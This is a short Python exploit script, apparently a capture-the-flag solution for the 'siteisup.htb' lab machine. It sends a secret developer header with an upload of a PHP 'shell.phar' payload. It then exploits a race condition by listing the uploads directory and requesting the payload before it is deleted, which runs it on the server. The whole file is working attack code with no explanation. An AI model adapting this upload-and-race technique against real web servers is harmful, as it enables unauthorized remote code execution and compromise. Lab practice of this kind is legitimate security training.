import sys
import requests
from requests_toolbelt.utils import dump
import multiprocessing as mp
import re
import time

TARGET = 'http://siteisup.htb'
RHOST = 'dev.siteisup.htb'
PAYLOAD_FILE = 'shell.phar'
OUT_FILE = 'output.html'

# Upload payload
# --------------------------------------------
files = {
    'file': open(PAYLOAD_FILE, 'rb')
}
data = {
    'check': 1
}
headers = {
    'Host': RHOST,
    'Special-Dev': 'only4dev'
}
# r = requests.post(TARGET, headers=headers, data=data, files=files)
post_proc = mp.Process(target=requests.post, args=[TARGET], kwargs={'headers':headers, 'data':data, 'files':files})
post_proc.start()
print('[+] Started post proc')
time.sleep(1)

# Call payload
# --------------------------------------------
# while post_proc.is_alive():
r = requests.get(TARGET + '/uploads/', headers=headers)
matches = re.findall('\<td\>\<a href="(.{32})\/"\>(.{32})\/\<\/a\>', r.text)
if not matches:
    print('[!] Payload not found in upload directry')

upload_files = [m[0] for m in matches]
print('\n[+] {} dirs found in upload directory'.format(len(upload_files)))

for file in reversed(upload_files):
    r = requests.get(TARGET + '/uploads/' + file + '/' + PAYLOAD_FILE , headers=headers)
    if r.status_code != 404:
        print('[+] File found. Output saved')
        with open(OUT_FILE, 'w') as f:
            f.write(r.text)

post_proc.terminate()
